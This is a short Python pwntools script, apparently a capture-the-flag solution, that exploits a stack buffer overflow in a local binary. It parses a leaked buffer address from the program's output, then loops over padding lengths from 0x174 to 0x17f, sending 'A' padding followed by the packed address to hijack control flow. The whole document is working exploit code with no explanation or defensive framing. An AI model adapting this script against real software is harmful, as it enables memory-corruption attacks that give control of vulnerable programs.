from pwn import *
import re, sys
context(os='linux', log_level='info')
pname = './xpl'
for i in range(0x174,0x180):
    p = process(pname)
    junk = p.recvline()
    res = re.findall(r'Interesting data loaded at (.*)', junk)
    if len(res)<1: sys.exit(1)
    log.info('Leaked Buffer Addr: {}'.format(res[0]))
    junk += p.recvuntil('Your username? ')
    p.sendline("A"*i+p64(int(res[0],16)))
    #print junk
    try:
        out = p.recvall()
        print '[',i,']:',out
    except:
        pass
